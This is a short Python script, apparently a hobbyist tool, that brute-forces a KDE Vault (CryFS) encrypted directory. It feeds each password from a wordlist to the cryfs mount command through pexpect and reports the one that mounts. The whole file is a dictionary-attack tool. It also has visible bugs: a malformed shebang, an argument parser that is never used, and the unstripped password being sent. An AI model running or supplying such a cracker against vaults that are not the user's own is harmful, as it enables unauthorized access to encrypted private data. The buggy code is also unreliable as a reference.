#!/usr/env/python3
# Author: KenjiDoom
import pexpect
import argparse


def keywords():
    parser = argparse.ArgumentParser(description='Bruteforce KDE-Vaults')
    parser.add_argument('wordlist', metavar='--w', type=str, help='Wordlist file, password file location, must be a txt file. ')
    parser.add_argument('basedir', metavar='--b', type=str, help='The base directory, ENC file location. ') 
    parser.add_argument('mountdir', metavar='--m', type=str, help='Mount directory for the ENC file. ')
    #args = parser.parse_args()
    print(args.wordlist + args.basedir + args.mountdir) #check to see if its working 




def main():
    print (""" 
            Password list file.
            BaseDir & MountDir
            """)

    passfile = input("> ")
    basedir = input("> ")
    mountdir = input("> ")
    fileopen = open(passfile,  'r') # rb for bytes inlcuded

    for password in fileopen: # This will give it the loop
        passwords = password.strip() # Now we need a destination for the passwords
        command1 = pexpect.spawn('cryfs {0} {1}'.format(basedir, mountdir))
        command1.expect('Password:')
        command1.sendline(password)
        result = command1.expect(['Error 11: Could not load config file. Did you enter the correct password?', 'Mounting filesystem. To unmount, call:'])
        if result == 0:
            print('Attacking [{0}] with: {1} '.format(basedir, password))
        elif result == 1:
            print('Done [{0}] [{1}] Password:{2}'.format(basedir, mountdir, password))
            break




main()

